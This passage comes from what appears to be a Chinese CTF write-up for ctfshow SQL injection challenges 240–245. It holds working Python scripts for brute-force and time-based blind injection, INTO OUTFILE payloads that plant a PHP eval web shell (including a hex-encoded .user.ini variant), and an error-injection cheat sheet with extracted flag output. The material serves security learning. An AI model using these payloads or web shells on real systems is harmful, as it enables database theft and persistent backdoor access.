                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\2087645-20211009153226087-633437425.png"
                      alt="image-20211009150614540"
                ></p>
<p>可以看到这个师傅在操作的时候，字符也只选了6个（flagbc），要是也是全写完的话估计也得要很长时间，我自己没试。要是真遇到的话，真的耗阳寿。</p>
<h2 id="240（再加上过滤mysql字段）"><a href="#240（再加上过滤mysql字段）" class="headerlink" title="240（再加上过滤mysql字段）"></a>240（再加上过滤mysql字段）</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//插入数据</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into ctfshow_user(username,pass) value(&#x27;<span class="subst">&#123;$username&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;);&quot;</span>;</span><br><span class="line"><span class="comment">//过滤空格 or sys mysql</span></span><br></pre></td></tr></table></figure></div>

<p><strong>我真的裂开，上一题好歹还有数据库，好家伙，这回连数据库也给我办了，牛逼。真就阳寿题？</strong></p>
<p>然后发现有个Hint</p>
<blockquote>
<p>Hint: 表名共9位，flag开头，后五位由a&#x2F;b组成，如flagabaab，全小写</p>
</blockquote>
<p><strong>表名爆破就ok，但是咱又咋知道列名，这样咋来判断我们的脚本是否正确，上网找了找，基本上都是有之前的题易得列名是flag，只用猜数据库名&#x3D;。&#x3D;，行吧，比赛遇到直接。。。。得，就这样吧</strong></p>
<p>写个脚本：</p>
<h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://ba8eb13e-9ed6-4e98-ab23-a0e2e710ba64.challenge.ctf.show/api/insert.php&quot;</span></span><br><span class="line">payloads = [&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">f&quot;,(select(flag)from(flag<span class="subst">&#123;a&#125;</span>)))#;&quot;</span></span><br><span class="line">&#125;<span class="keyword">for</span> a <span class="keyword">in</span> [<span class="string">f&quot;<span class="subst">&#123;a&#125;</span><span class="subst">&#123;b&#125;</span><span class="subst">&#123;c&#125;</span><span class="subst">&#123;d&#125;</span><span class="subst">&#123;e&#125;</span>&quot;</span><span class="keyword">for</span> a <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span> <span class="keyword">for</span> b <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span> <span class="keyword">for</span> d <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span> <span class="keyword">for</span> e <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span>]]</span><br><span class="line"><span class="comment"># 这个payload 是参考 b477eRy 师傅写的，这里的生成list的for循环只能说python知识又学到了（我之前完全没学过python，都是凑合着写的）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line">    response = requests.post(url, data=payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;trying:  <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>回页面刷新就有flag了。</p>
<h1 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h1><h2 id="241"><a href="#241" class="headerlink" title="241"></a>241</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//删除记录</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;delete from  ctfshow_user where id = <span class="subst">&#123;$id&#125;</span>&quot;</span>;</span><br><span class="line"><span class="comment">//无过滤</span></span><br></pre></td></tr></table></figure></div>

<p>无过滤的 delete 注入，没有分号数字型注入，布尔盲注记录会越来越少（还没跑完，记录就无了&#x3D;。&#x3D;），用时间盲注。</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://69a92f38-e63f-4686-82b2-5ee60a7ed353.challenge.ctf.show/api/delete.php&quot;</span></span><br><span class="line"><span class="comment"># 表名 banlist,ctfshow_user,flag</span></span><br><span class="line"><span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flag,info</span></span><br><span class="line"><span class="comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;select flag from flag&quot;</span></span><br><span class="line">condition = <span class="string">&quot;ascii(mid((&#123;&#125;),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: <span class="string">f&quot;if(<span class="subst">&#123;p&#125;</span>,sleep(0.05),0)&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    time_s = <span class="literal">None</span></span><br><span class="line">    time_e = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            time_s = time.time()</span><br><span class="line">            _ = requests.post(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>&quot;</span>, data=data)</span><br><span class="line">            time_e = time.time()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> time_e-time_s &gt;= <span class="number">0.9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I&#x27;m starting!&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span>(<span class="built_in">abs</span>(start - end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        mid = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_payload(condition.<span class="built_in">format</span>(payload, index, mid)):</span><br><span class="line">            start = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = mid</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(end) == <span class="string">&quot;!&quot;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(end)==<span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot; Success! &quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>时间盲注有天生的劣势，如果时间长了跑的不对，就一段一段跑，还有时间上也可以进行修改修改，0.9在本机上跑的非常好</p>
<h1 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h1><h2 id="242"><a href="#242" class="headerlink" title="242"></a>242</h2><p><strong>先看题</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//备份表</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from ctfshow_user into outfile &#x27;/var/www/html/dump/<span class="subst">&#123;$filename&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//无过滤</span></span><br></pre></td></tr></table></figure></div>



<p><a class="link"   href="https://www.jianshu.com/p/1f97795443ce" >sql注入之outfile - 简书 (jianshu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.freebuf.com/articles/web/275874.html" >mysql注入之into outfile - FreeBuf网络安全行业门户 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>大致了解了一下 into outfile 这个东东</p>
<p>然后还有查了一下语法常用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT ... INTO OUTFILE &#x27;file_name&#x27;</span><br><span class="line">        [CHARACTER SET charset_name]				//设置字符集</span><br><span class="line">        [export_options]							//拓展选项</span><br><span class="line"></span><br><span class="line">export_options:										//具体拓展选项</span><br><span class="line">    [&#123;FIELDS | COLUMNS&#125;</span><br><span class="line">        [TERMINATED BY &#x27;string&#x27;]//分隔符</span><br><span class="line">        [[OPTIONALLY] ENCLOSED BY &#x27;char&#x27;]</span><br><span class="line">        [ESCAPED BY &#x27;char&#x27;]</span><br><span class="line">    ]</span><br><span class="line">    [LINES</span><br><span class="line">        [STARTING BY &#x27;string&#x27;]</span><br><span class="line">        [TERMINATED BY &#x27;string&#x27;]</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">“OPTION”参数为可选参数选项，其可能的取值有：</span><br><span class="line"></span><br><span class="line">`FIELDS TERMINATED BY &#x27;字符串&#x27;`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。</span><br><span class="line"></span><br><span class="line">`FIELDS ENCLOSED BY &#x27;字符&#x27;`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。</span><br><span class="line"></span><br><span class="line">`FIELDS OPTIONALLY ENCLOSED BY &#x27;字符&#x27;`：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。</span><br><span class="line"></span><br><span class="line">`FIELDS ESCAPED BY &#x27;字符&#x27;`：设置转义字符，只能为单个字符。默认值为“\”。</span><br><span class="line"></span><br><span class="line">`LINES STARTING BY &#x27;字符串&#x27;`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。</span><br><span class="line"></span><br><span class="line">`LINES TERMINATED BY &#x27;字符串&#x27;`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。</span><br></pre></td></tr></table></figure></div>

<p><strong>利用 export_options 插 shell</strong></p>
<p>（STARTING BY 和 TERMINATED BY 都行 ，只要文件中存在就行）</p>
<h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/api/dump.php</span><br><span class="line">filename=koishi.php&#x27;LINES STARTING BY &quot;&lt;?php eval($_POST[koishi]);?&gt;&quot;;#</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220829215555881.png"
                      alt="image-20220829215555881"
                ></p>
<p>上传成功后蚁剑连接url&#x2F;dump&#x2F;koishi.php</p>
<p>密码为 koishi</p>
<p>flag在 <code>/flag.here</code></p>
<p>（我在本地上传shell的时候被火绒拦截了，怕在本地留后门，就没关杀毒软件，既然拦截了，就是正确了，懒得试了）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220829220855299.png"
                      alt="image-20220829220855299"
                ></p>
<h2 id="243-多过滤了php，新姿势"><a href="#243-多过滤了php，新姿势" class="headerlink" title="243(多过滤了php，新姿势)"></a>243(多过滤了php，新姿势)</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//备份表</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from ctfshow_user into outfile &#x27;/var/www/html/dump/<span class="subst">&#123;$filename&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line">  </span><br><span class="line"><span class="comment">//过滤了php</span></span><br></pre></td></tr></table></figure></div>



<h3 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h3><p>文件内容使用编码绕过就行了，文件后缀使用<code>.user.ini</code></p>
<p>可供参考的资料：<a class="link"   href="https://www.php.cn/php-weizijiaocheng-473944.html" >php中.user.ini究竟是个啥神秘东东？-php教程-PHP中文网 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>ini 文件中注释 <code>;</code> 开头，这里用 starting by ‘;’ 注释掉原本的内容，后面的字符串前面加个换行就不影响了。（b477eRy师傅还是强啊orz）</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">filename<span class="operator">=</span>.user.ini<span class="string">&#x27; lines starting by &#x27;</span>;<span class="string">&#x27; terminated by 0x0a0a6175746f5f70726570656e645f66696c653d736166652e6a70670a6175746f5f617070656e645f66696c653d736166652e6a7067; %23</span></span><br></pre></td></tr></table></figure></div>

<p>16进制原字符串为：</p>
<div class="highlight-container" data-rel="Ini"><figure class="iseeu highlight ini"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">auto_prepend_file</span>=safe.jpg</span><br><span class="line"><span class="attr">auto_append_file</span>=safe.jpg</span><br></pre></td></tr></table></figure></div>

<p>使用这个的目的：参考文章：<a class="link"   href="https://www.php.cn/php-notebook-179266.html" >PHP中的auto_prepend_file和auto_append_file-php手册-PHP中文网 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>就是让ini文件去读取我们的 safe.jpg。</p>
<p> 然后我们只需要再写入我们的jpg就行了</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">filename=safe.jpg<span class="string">&#x27; lines terminated by 0x3c3f706870206576616c28245f504f53545b6b6f697368695d293b203f3e; %23</span></span><br></pre></td></tr></table></figure></div>

<p>这里的16进制字符串原串是：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[koishi]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>之后</p>
<p>蚁剑连接 <code>/dump/</code>，flag 在 <code>/flag.here</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220830095349947.png"
                      alt="image-20220830095349947"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220830095414807.png"
                      alt="image-20220830095414807"
                ></p>
<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="知识学习"><a href="#知识学习" class="headerlink" title="知识学习"></a>知识学习</h2><p><a class="link"   href="https://blog.csdn.net/silence1_/article/details/90812612" >(37条消息) sql注入之报错注入_Dar1in9的博客-CSDN博客_报错注入 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>顺便在其他博客发现了这个好东西（下面的什么select user()  、  version()啥的可以换成其他想要执行的命令）</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> floor <span class="operator">+</span> rand <span class="operator">+</span> <span class="keyword">group</span> <span class="keyword">by</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span> <span class="keyword">union</span> <span class="keyword">select</span>  <span class="operator">!</span><span class="number">1</span>)x <span class="keyword">group</span> <span class="keyword">by</span> concat((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables  limit <span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)));</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ExtractValue</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x5c</span>, (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables limit <span class="number">1</span>)));</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> UpdateXml</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>())),<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> Name_Const(<span class="operator">&gt;</span><span class="number">5.0</span><span class="number">.12</span>)</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> NAME_CONST(version(),<span class="number">0</span>),NAME_CONST(version(),<span class="number">0</span>))x;</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span> <span class="keyword">Join</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.user a <span class="keyword">join</span> mysql.user b)c;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.user a <span class="keyword">join</span> mysql.user b <span class="keyword">using</span>(Host))c;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.user a <span class="keyword">join</span> mysql.user b <span class="keyword">using</span>(Host,<span class="keyword">User</span>))c;</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span> <span class="built_in">exp</span>()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="built_in">Exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> version())a));</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span> geometrycollection()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> geometrycollection((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span> multipoint()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipoint((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">9.</span> polygon()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">10.</span> multipolygon()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipolygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">11.</span> linestring()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> linestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">12.</span> multilinestring()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multilinestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>





<h2 id="244"><a href="#244" class="headerlink" title="244"></a>244</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//备份表</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//无过滤</span></span><br></pre></td></tr></table></figure></div>



<p>基础的报错注入，直接上payload</p>
<h3 id="写法1-–updatexml"><a href="#写法1-–updatexml" class="headerlink" title="写法1 –updatexml"></a>写法1 –updatexml</h3><p>测试</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span>koishi<span class="string">&#x27;,concat(0x2c,(select database())),&#x27;</span>cirno<span class="string">&#x27;);--+</span></span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"># 表名</span><br><span class="line"># &#123;&quot;code&quot;:<span class="number">0</span>,&quot;msg&quot;:&quot;XPATH syntax error: &#x27;|banlist,ctfshow_flag,ctfshow_us&#x27;&quot;,&quot;count&quot;:<span class="number">1</span>,&quot;data&quot;:[]&#125;</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7c,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) %23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 列名</span></span><br><span class="line"><span class="string"># &#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;XPATH syntax error: &#x27;</span><span class="operator">|</span>id,flag,info<span class="string">&#x27;&quot;,&quot;count&quot;:1,&quot;data&quot;:[]&#125;</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7c</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;ctfshow_flag&#x27;</span>)),<span class="number">1</span>) <span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br><span class="line">（因为返回最多<span class="number">32</span>个字符，所以我们要使用substr或者mid等分别查询）</span><br><span class="line"># 字段值<span class="number">1</span></span><br><span class="line"># &#123;&quot;code&quot;:<span class="number">0</span>,&quot;msg&quot;:&quot;XPATH syntax error: &#x27;|ctfshow&#123;eb2bbc9e-e1f1-41c1-aa6d&#x27;&quot;,&quot;count&quot;:<span class="number">1</span>,&quot;data&quot;:[]&#125;</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7c,(select flag from ctfshow_flag)),1) %23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 字段值2</span></span><br><span class="line"><span class="string"># &#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;XPATH syntax error: &#x27;</span><span class="operator">|</span><span class="number">6</span>d<span class="operator">-</span>be9c13942a09&#125;<span class="string">&#x27;&quot;,&quot;count&quot;:1,&quot;data&quot;:[]&#125;</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7c</span>,mid((<span class="keyword">select</span> flag <span class="keyword">from</span> ctfshow_flag),<span class="number">30</span>,<span class="number">30</span>)),<span class="number">1</span>) <span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br><span class="line">#最终拼起来就是ctfshow&#123;eb2bbc9e<span class="operator">-</span>e1f1<span class="number">-41</span>c1<span class="operator">-</span>aa6d<span class="operator">-</span>be9c13942a09&#125;</span><br></pre></td></tr></table></figure></div>



<h3 id="写法2-–extractvalue"><a href="#写法2-–extractvalue" class="headerlink" title="写法2 –extractvalue"></a>写法2 –extractvalue</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">测试</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; or extractvalue(rand(),concat(0x2c,(select database())));--+</span></span><br></pre></td></tr></table></figure></div>



<p>（rand（）可以换成随便的字符）</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"># 查表名</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; or extractvalue(rand(),concat(0x2c,(select group_concat(table_name)from information_schema.tables where table_schema=database())));--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查列名</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">or</span> extractvalue(rand(),concat(<span class="number">0x2c</span>,(<span class="keyword">select</span> group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database()<span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;ctfshow_flag&#x27;</span>)));<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"># 查数据<span class="comment">--1</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; or extractvalue(rand(),concat(0x2c,(select group_concat(flag)from ctfshow_flag)));--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查数据--2</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">or</span> extractvalue(rand(),concat(<span class="number">0x2c</span>,substr((<span class="keyword">select</span> group_concat(flag)<span class="keyword">from</span> ctfshow_flag),<span class="number">20</span>,<span class="number">42</span>)));<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">#拼接起来 ctfshow&#123;eb2bbc9e<span class="operator">-</span>e1f1<span class="number">-41</span>c1<span class="operator">-</span>aa6d<span class="operator">-</span>be9c13942a09&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="245"><a href="#245" class="headerlink" title="245"></a>245</h2><p>过滤了updatexml，没啥好说的，换成上面的 extractvalue 就行</p>
